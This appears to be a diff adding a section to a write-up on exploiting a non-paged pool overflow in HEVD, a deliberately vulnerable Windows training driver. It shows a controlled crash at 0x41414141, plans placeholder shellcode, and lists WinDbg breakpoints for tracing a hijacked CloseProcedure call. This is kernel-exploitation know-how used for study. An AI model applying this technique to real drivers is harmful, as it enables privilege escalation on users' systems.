@@ -839,6 +839,26 @@ void free_chunks() {
 ```
 
 We run this code and what happens??
+```
+Access violation - code c0000005 (!!! second chance !!!)
+41414141 ??              ???
+```
+
+We did it!!
+
+Now let's just allocate some shellcode there...
+
+## Shellcode Implementation
+We're going to set up some dummy shellcode of interrupts just as a place holder and then set an access breakpoint on `0x60` so that when any process tries to read a byte of data at that address, our breakpoint activates and we can examine the callstack and dissassembly that got us to this point, ie looking inside the `CloseProcedure` routine. 
+
+These are my breakpoints right now:
+```
+kd> bp !HEVD+4D64
+kd> ba r1 0x60
+kd> bl
+ 0 e 8c295d64     0001 (0001) HEVD!TriggerNonPagedPoolOverflow+0xe6
+ 1 e 00000060 r 1 0001 (0001) 
+```
 
 
 
